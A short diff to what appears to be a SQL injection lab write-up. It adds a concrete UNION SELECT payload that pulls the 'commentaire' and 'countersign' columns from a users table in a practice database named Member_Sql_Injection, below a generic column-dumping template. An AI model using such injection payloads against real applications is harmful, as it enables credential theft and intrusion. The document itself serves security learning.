@@ -192,3 +192,8 @@ Now we got all information to acces the content of the column in the table  with
 1 UNION SELECT [column1], [colomn2]  FROM [database].[tables];
 ```
 
+and on the column commentaire and countersign in the tables users in the database Member_Sql_Injection
+
+
+1 UNION SELECT commentaire, countersign  FROM Member_Sql_Injection.users;
+
